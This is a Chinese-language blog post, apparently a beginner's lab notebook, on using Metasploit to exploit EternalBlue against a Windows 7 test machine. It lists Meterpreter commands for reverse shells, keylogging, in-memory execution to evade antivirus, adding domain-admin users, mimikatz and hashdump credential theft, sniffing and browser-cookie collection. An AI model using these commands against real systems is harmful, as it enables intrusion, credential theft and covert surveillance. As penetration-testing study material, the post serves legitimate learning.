@@ -1,0 +1,1610 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>msf初学 | h0ld1rs的随手记</title><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="关于学习msf的一些情况">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf初学">
+<meta property="og:url" content="https://h0ld1rs.github.io/2021/01/05/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/msf%E5%88%9D%E5%AD%A6/index.html">
+<meta property="og:site_name" content="h0ld1rs的随手记">
+<meta property="og:description" content="关于学习msf的一些情况">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/9.jpg">
+<meta property="article:published_time" content="2021-01-05T01:42:18.000Z">
+<meta property="article:modified_time" content="2021-07-31T07:28:09.441Z">
+<meta property="article:author" content="h0ld1rs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/9.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/2021/01/05/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/msf%E5%88%9D%E5%AD%A6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-31 15:28:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/9.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的随手记</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">msf初学</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-05T01:42:18.000Z" title="发表于 2021-01-05 09:42:18">2021-01-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-31T07:28:09.441Z" title="更新于 2021-07-31 15:28:09">2021-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">16.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>68分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="MSF初学"><a href="#MSF初学" class="headerlink" title="MSF初学"></a>MSF初学</h1><p>首先，需要启动kali的服务</p>
+<p><code>service postgresql start</code></p>
+<p>进入msf的工作台后<code>msfconsole</code></p>
+<p>输入 <code>db_status</code>，查看连接状态</p>
+<h2 id="1-创建工作台"><a href="#1-创建工作台" class="headerlink" title="1 创建工作台"></a>1 创建工作台</h2><p><code>workspace -a test</code> 创建一个名为<code>test</code>的工作台</p>
+<p>​                     -d   即是删除</p>
+<h2 id="2-导入导出"><a href="#2-导入导出" class="headerlink" title="2 导入导出"></a>2 导入导出</h2><p>db_import  目录</p>
+<p>db_export  目录</p>
+<p>hosts 查看扫描结果</p>
+<h2 id="3-下载rlwrap解决特殊按键乱码"><a href="#3-下载rlwrap解决特殊按键乱码" class="headerlink" title="3. 下载rlwrap解决特殊按键乱码"></a>3. 下载rlwrap解决特殊按键乱码</h2><p>下次使用 <code>rlwrap msfconsole</code>启动即可解决在里面遇到的乱码问题，当然还有其他的解决方式</p>
+<h1 id="win7靶场实战"><a href="#win7靶场实战" class="headerlink" title="win7靶场实战"></a>win7靶场实战</h1><p>切记先关掉win7的防火墙</p>
+<p>用了几个msdn上不同版本的win7，发现<code>cn_windows_7_enterprise_with_sp1_x64_dvd_u_677685</code>版本的可以连接成功，别的版本的win7，我只成功让win7蓝屏，但是无法建立连接，蓝屏也算是一种<code>POC</code>漏洞</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>发现目标网段的存活主机:</p>
+<p>我们可以利用auxiliary这个模块来获取目标网端的信息，包括端口开放情况、主机存活情况。</p>
+<blockquote>
+<p>auxiliary/scanner/discovery/arp_sweep</p>
+<p>auxiliary/scancer/smb/smb_version 存活的445主机</p>
+<p>auxiliary/scanner/portscan/syn  端口扫描</p>
+<p>auxiliary/scanner/telnet/telnet_version telent服务扫描</p>
+<p>auxiliary/scanner/rdp/rdp_scanner 远程桌面服务扫描</p>
+<p>auxiliary/scanner/ssh/ssh_version ssh主机扫描</p>
+</blockquote>
+<p>一般情况下我们在渗透测试的时候，如果在不知道资产的情况下，我们会把整个网端进行扫描存活主机，然后再对存活的信息收集信息，这样的话就可以缩短我们的渗透测试时间，而不盲目的去测试，有时候盲目信息收集会导致后期渗透的道路都是弯的，达不到预期的效果。</p>
+<p>不管是端口扫描还是探测存活主机，都是要设置目标IP地址set rhosts ip地址，如果扫描整个网段的话，最后设置一下线程：set thread 线程数(根据情况设置)。</p>
+<p><code>use auxiliary/scanner/discovery/arp_sweep</code></p>
+<p><code>set rhost xxxx/24</code> 当时这里遇到的 /24是指子网掩码的位数。</p>
+<p>子网掩码的位数总共有32个，写的的/24个就bai是24个1，其它8位都是0</p>
+<p>最后设置线程<code>set threads 30</code>(根据实际情况设置)</p>
+<p>点击run ，就会有回显，回显当前网段存活的主机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152544.png"></p>
+<p>​    这样的话我们就可以对这些存活主机进行下一步的信息收集，比如22、445、3389等敏感端口开放情况探测，在这里需要说明一下，以小白的渗透测试经验，一般我先不扫描整个网端，因为这样对目标主机有损耗，可以直接扫描有溢出漏洞的高危端口，如果有的话，那么就可以通过溢出进行提权，这样的方法也是一种捷径。相反的情况下，如果全端口扫描的话个人建议用nmap工具。</p>
+<p>​    下面我们探测一下网段中开启445端口的主机，通过扫描发现网段中有1台主机开启了445端口，这样的话我们就可以在后期的漏洞探测中测试是否存在永恒之蓝漏洞。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152606.png"></p>
+<h2 id="攻击开始"><a href="#攻击开始" class="headerlink" title="攻击开始"></a>攻击开始</h2><p>之后使用 exploit模块进行攻击，use exploit/windows/smb/ms17_010_eternalblue</p>
+<p>设置payload 一般有几种，默认的则是 <code>reverse_tcp</code></p>
+<blockquote>
+<ul>
+<li>reverse_tcp 这是一个基于TCP的反向链接反弹shell, 使用起来很稳定</li>
+<li>reverse_http 基于http方式的反向连接，在网速慢的情况下不稳定。</li>
+<li>reverse_https 基于https方式的反向连接，在网速慢的情况下不稳定， https如果反弹没有收到数据，可以将监听端口换成443试试</li>
+<li>bind_tcp 这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST</li>
+</ul>
+</blockquote>
+<p>然后设置 rhosts 和  thread   </p>
+<p>lhost好像较高版本会自动输入，port会默认为4444端口</p>
+<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p>之后进入<strong>meterpreter</strong>模块</p>
+<h4 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h4><blockquote>
+<p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p>
+<p>最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。</p>
+<p>需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况.</p>
+</blockquote>
+<blockquote>
+<p>Metasploit提供了各个主流平台的Meterpreter版本，包括Windows、Linux，同时支持x86、x64平台，另外，Meterpreter还提供了基于PHP和Java语言的实现。Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter还支持Ruby脚本形式的扩展。所以Ruby语言还很有必要。</p>
+</blockquote>
+<ul>
+<li><p>background#返回，把meterpreter后台挂起</p>
+</li>
+<li><p>ps 可以看到当前肉鸡后台运行的文件程序</p>
+</li>
+<li><p>bgkill# 杀死一个背景 meterpreter 脚本</p>
+</li>
+<li><p>bglist#提供所有正在运行的后台脚本的列表</p>
+</li>
+<li><p>bgrun#作为一个后台线程运行脚本</p>
+</li>
+<li><p>channel#显示活动频道</p>
+</li>
+<li><p>sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</p>
+</li>
+<li><p>sesssions -k number #与会话进行交互</p>
+</li>
+<li><p>close# 关闭通道</p>
+</li>
+<li><p>exit# 终止 meterpreter 会话</p>
+</li>
+<li><p>quit# 终止 meterpreter 会话</p>
+</li>
+<li><p>interact id #切换进一个信道</p>
+</li>
+<li><p>run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</p>
+</li>
+<li><p>irb# 进入 Ruby 脚本模式</p>
+</li>
+<li><p>read# 从通道读取数据</p>
+</li>
+<li><p>write# 将数据写入到一个通道</p>
+</li>
+<li><p>run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本</p>
+</li>
+<li><p>use# 加载 meterpreter 的扩展</p>
+</li>
+<li><p>load/use#加载模块</p>
+</li>
+<li><p>Resource#执行一个已有的rc脚本</p>
+</li>
+</ul>
+<p>最后我们可以输入shell进行客户端， 但是 发现乱码</p>
+<p>归根到底，就是windows和linux系统的中文编码不同，所以导致windows系统上的中文在linux系统上会乱码</p>
+<p>输入 <code>chcp 65001</code> 按下 <code>enter键</code>可以发现恢复正常</p>
+<blockquote>
+<p>CHCP是一个计算机指令，能够显示或设置活动代码页编号。</p>
+<p>65001     UTF-8代码页</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152631.png"></p>
+<h4 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h4><ul>
+<li><p>cat c:\boot.ini#查看文件内容,文件必须存在（xp用的比较多，win7没有）</p>
+</li>
+<li><p>del c:\boot.ini #删除指定的文件</p>
+</li>
+<li><p>upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload setup.exe C:\windows\system32\</p>
+<p>download nimeia.txt /root/Desktop/  # 下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295******125\Msg2.0.db /root/</p>
+</li>
+<li><p>edit c:\boot.ini # 编辑文件</p>
+</li>
+<li><p>getlwd#打印本地目录 (<em>L</em>可以理解为localhost)</p>
+</li>
+<li><p>lpwd#打印本地目录</p>
+</li>
+<li><p>getwd#打印工作目录</p>
+</li>
+<li><p>lcd#更改本地目录</p>
+</li>
+<li><p>ls#列出在当前目录中的文件列表 (入侵机)</p>
+</li>
+<li><p>pwd#输出工作目录(入侵机)</p>
+</li>
+<li><p>cd c:\ #进入目录文件下</p>
+</li>
+<li><p>rm file #删除文件</p>
+</li>
+<li><p>mkdir dier #在受害者系统上的创建目录</p>
+</li>
+<li><p>rmdir#受害者系统上删除目录</p>
+</li>
+<li><p>dir#列出目标主机的文件和文件夹信息</p>
+</li>
+<li><p>mv#修改目标主机上的文件名</p>
+</li>
+<li><p>search -d d:\www -f web.config #search 文件，如search -d c:\ -f*.doc</p>
+</li>
+</ul>
+<p>meterpreter &gt; search -f autoexec.bat #搜索文件</p>
+<p>meterpreter &gt; search -f sea*.bat c:\xamp\</p>
+<p><code>search - f xxx.xxx</code>（可以使用通配符）</p>
+<ul>
+<li><p>enumdesktops   #用户登录数</p>
+</li>
+<li><p>sysinfo”命令 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞</p>
+</li>
+<li><p>execute命令 “execute”命令为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令</p>
+<p>如果希望隐藏后台执行，加参数-H</p>
+<p><code>execute -H -f notepad.exe</code></p>
+<p>我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上</p>
+<p><code>execute -i -H -f  cmd.exe</code>    这样和shell进入终端运行命令是一样的了</p>
+<p>在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。</p>
+<p><code>execute -H -m -d notepad.exe-f wce.exe -a &quot;-o wce.txt&quot;</code></p>
+<blockquote>
+<p>d 在目标主机执行时显示的进程名称（用以伪装）</p>
+<p>-m 直接从内存中执行</p>
+<p>“-o wce.txt”是wce.exe的运行参</p>
+</blockquote>
+</li>
+<li><p>idletime命令     显示目标机器截止到当前无操作命令的时间</p>
+</li>
+</ul>
+<h4 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h4><ul>
+<li><p>ipconfig/ifconfig#显示网络接口的关键信息，包括 IP 地址</p>
+</li>
+<li><p>portfwd -h</p>
+<p>用法：portfwd [-h] [add | delete | list | flush] [args]</p>
+</li>
+</ul>
+<blockquote>
+<p>选项：</p>
+<p>-L <opt>要监听的本地主机（可选）</p>
+<p>-h帮助横幅</p>
+<p>-l <opt>要监听的本地端口</p>
+<p>-p <opt>连接到的远程端口</p>
+<p>-r <opt>要连接到的远程主机</p>
+</blockquote>
+<p><code>portfwd add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444</code></p>
+<p>在靶机上开启3389端口</p>
+<p>之后在窗口开启终端 <code>rdesktop 127.0.0.1:4444</code>即可登录远程，这里说一下，登录以后，不可直接执行管理员权限，只能执行普通权限</p>
+<ul>
+<li><p>route#查看或修改受害者路由表</p>
+<p>route add 192.168.1.0 255.255.255.0 1 #添加动态路由</p>
+<p>route print #路由表输出</p>
+<p>runget_local_subnets #目标主机的内网IP段情况</p>
+</li>
+</ul>
+<blockquote>
+<p>大多时候我们获取到的meterpreter shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。</p>
+<p>查看shell网络环境：</p>
+<p>meterpreter&gt;run get_local_subnets</p>
+<p>添加一条通向目标服务器内网的路由</p>
+<p>meterpreter&gt;run autoroute -s 100.0.0.0/8  #(根据目标内网网络而定)</p>
+<p>查看路由设置：</p>
+<p>meterpreter&gt;run autoroute –p</p>
+<p>一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况。</p>
+<p>route print</p>
+<p>如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。</p>
+<p>msf&gt;route add 10.0.0.0 255.0.0.0 1</p>
+<p>说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
+</blockquote>
+<ul>
+<li><p>Arp    #看ARP缓冲表</p>
+</li>
+<li><p>Getproxy   #获取代理</p>
+</li>
+</ul>
+<h4 id="键盘监听"><a href="#键盘监听" class="headerlink" title="键盘监听"></a>键盘监听</h4><p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p>
+<ul>
+<li><p>keyscan_start：开启键盘记录功能</p>
+</li>
+<li><p>keyscan_dump：显示捕捉到的键盘记录信息</p>
+</li>
+<li><p>keyscan_stop：停止键盘记录功能</p>
+</li>
+<li><p>uictl enable keyboard/mouse#接管目标主机的键盘和鼠标。</p>
+</li>
+<li><p>meterpreter &gt; keyscan_start #针对远程目标主机开启键盘记录功能</p>
+</li>
+<li><p>Starting the keystroke sniffer…</p>
+</li>
+<li><p>meterpreter &gt; keyscan_dump #存储目标主机上捕获的键盘记录</p>
+</li>
+<li><p>Dumping captured keystrokes…</p>
+</li>
+</ul>
+<p><code>dir &lt;Return&gt; cd&lt;Ctrl&gt; &lt;LCtrl&gt;</code></p>
+<blockquote>
+<p>meterpreter &gt; keyscan_stop #停止针对目标主机的键盘记录</p>
+</blockquote>
+<blockquote>
+<p>Stopping the keystroke sniffer…</p>
+</blockquote>
+<ul>
+<li>screenshot 屏幕截屏</li>
+</ul>
+<blockquote>
+<p>这里需要注意一下windows会话窗口的概念，windows桌面划分为不同的会话(session)，以便于与windows交互。会话0代表控制台，1，2代表远程桌面。所以要截获键盘输入必须在0中进行。可以使用getdesktop查看或者截张图试试。否则使用setdesktop切换。</p>
+</blockquote>
+<h4 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h4><ul>
+<li><p>reboot#重新启动受害人的计算机</p>
+</li>
+<li><p>reg#与受害人的注册表进行交互</p>
+</li>
+<li><p>rev2self#回到控制目标主机的初始用户账户下</p>
+</li>
+<li><p>shell#获得控制台权限</p>
+</li>
+<li><p>shutdown#关闭了受害者的计算机</p>
+</li>
+<li><p>sysinfo # 查看目标机系统信息，如机器名，操作系统等</p>
+</li>
+<li><p>add_user username password -h ip  #在远程目标主机上添加一个用户</p>
+</li>
+<li><p>add_group_user “Domain Admins” username -h ip  #将用户添加到目标主机的域管理员组中</p>
+</li>
+<li><p>shell命令  获取目标主机的远程命令行shell, 如果出错，考虑是目标主机限制了cmd.exe的访问权，可以使用migrate注入到管理员用户进程中再尝试</p>
+</li>
+</ul>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><blockquote>
+<p>meterpreter &gt; load mimikatz #加载mimikatz</p>
+<p>meterpreter &gt; msv #获取hash值</p>
+<p>meterpreter &gt; kerberos #获取明文</p>
+<p>meterpreter &gt;ssp  #获取明文信息</p>
+<p>meterpreter &gt; wdigest #获取系统账户信息</p>
+<p>meterpreter &gt;mimikatz_command -f a::  #必须要以错误的模块来让正确的模块显示</p>
+<p>meterpreter &gt;mimikatz_command -f hash::  #获取目标 hash</p>
+<p>meterpreter &gt; mimikatz_command -f samdump::hashes</p>
+<p>meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords</p>
+</blockquote>
+<h4 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h4><p>meterpreter &gt; use sniffer # 加载嗅探模块</p>
+<p>Loading extension sniffer…success.</p>
+<p>meterpreter &gt; sniffer_interfaces #列出目标主机所有开放的网络接口</p>
+<p>  1 - ‘WAN Miniport (Network Monitor)’ ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</p>
+<p>  2 - ‘Intel(R) PRO/1000 MT Desktop Adapter’ ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</p>
+<p>  3 - ‘Cisco Systems VPN Adapter’ ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )</p>
+<p>meterpreter &gt; sniffer_start 2 #获取正在实施嗅探网络接口的统计数据</p>
+<p>[*] Capture started on interface 2 (50000 packet buffer)</p>
+<p>meterpreter &gt; sniffer_dump 2 /tmp/test2.cap #在目标主机上针对特定范围的数据包缓冲区启动嗅探</p>
+<p>[*] Flushing packet capture buffer for interface 2…</p>
+<p>[*] Flushed 1176 packets (443692 bytes)</p>
+<p>[*] Downloaded 100% (443692/443692)…</p>
+<p>[*] Download completed, converting to PCAP…</p>
+<p>[*] PCAP file written to /tmp/test2.cap</p>
+<p>meterpreter &gt; sniffer_stop  2  #停止嗅探</p>
+<p>Metasploit包含sniffer脚本。Meterpreter的这个模块可以用来做数据包捕获,不需要在远程机器上安装任何软件：</p>
+<p>首先执行use sniffer命令作用为使用嗅探脚本。</p>
+<ul>
+<li><p>sniffer_dump ID filepath保存抓取的数据包</p>
+<p>sniffer_dump 1/tmp/1.cap</p>
+</li>
+<li><p>对抓取的包进行解包：</p>
+<p>use auxiliary/sniffer/psnuffle</p>
+<p>set pcapfile 1.cap</p>
+<p>run</p>
+</li>
+</ul>
+<h4 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h4><ul>
+<li><p>run post/windows/gather/checkvm #是否虚拟机</p>
+</li>
+<li><p>run post/windows/gather/enum_applications #获取安装软件信息</p>
+</li>
+<li><p>run post/windows/gather/dumplinks  #获取最近的文件操作</p>
+</li>
+<li><p>run post/windows/gather/enum_ie #获取IE缓存</p>
+</li>
+<li><p>run post/windows/gather/enum_chrome  #获取Chrome缓存</p>
+</li>
+<li><p>run scraper (hklm 注册表)          #获取常见信息</p>
+</li>
+</ul>
+<p>获取到的目标主机上的ie浏览器缓存历史记录和cookies信息等都保存到了攻击主机本地的/root/.msf5/loot/目录下,这里说IE7以上才有效</p>
+<h4 id="获取Hash"><a href="#获取Hash" class="headerlink" title="获取Hash"></a>获取Hash</h4><p>使用“hashdump”命令可以从系统提取用户名和密码hashes。使用hashdump命令可以获取目标主机的SAM文件，获取目标主机的账号密码hash信息，剩下的可以用爆破软件算出明文密码，微软一般用LM,NTML和NTLMv2形式的哈希表存储密码。若想运行这个命令, 需要有注册表和SAM [Security Account Manager]的系统的权限，如果你是作为一个普通的用户登陆的话，你需要提升权限.</p>
+<p>meterpreter &gt;  run post/windows/gather/smart_hashdump</p>
